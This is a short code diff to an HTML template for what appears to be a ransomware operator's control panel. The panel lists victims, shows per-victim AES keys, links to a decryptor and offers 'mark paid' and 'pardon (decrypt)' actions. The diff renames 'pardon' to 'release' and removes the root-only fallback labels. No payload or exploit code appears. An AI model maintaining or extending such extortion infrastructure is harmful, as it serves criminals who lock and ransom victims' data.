@@ -125,10 +125,8 @@
     <form method="post" action="{{ url_for('pardon', vid=v['vid']) }}" class="inline"
           onsubmit="return confirm('Pardon this victim and decrypt it?')">
       <input type="hidden" name="csrf" value="{{ csrf_token }}">
-      <button class="btn blue" type="submit">PARDON</button>
+      <button class="btn blue" type="submit">RELEASE</button>
     </form>
-    {% else %}
-    <span class="btn dim locked" title="requires root">ROOT ONLY</span>
     {% endif %}
     {% if v['aes_key'] %}
       <a class="btn blue" href="{{ url_for('admin_decryptor', vid=v['vid']) }}">CPP</a>
@@ -156,9 +154,7 @@
       <option value="reset">reset</option>
       <option value="paid">mark paid</option>
       {% if current_role == 'root' %}
-      <option value="pardon">pardon (decrypt)</option>
-      {% else %}
-      <option value="pardon" disabled>pardon (root only)</option>
+      <option value="pardon">release (decrypt)</option>
       {% endif %}
       <option value="delete">delete</option>
     </select></div>
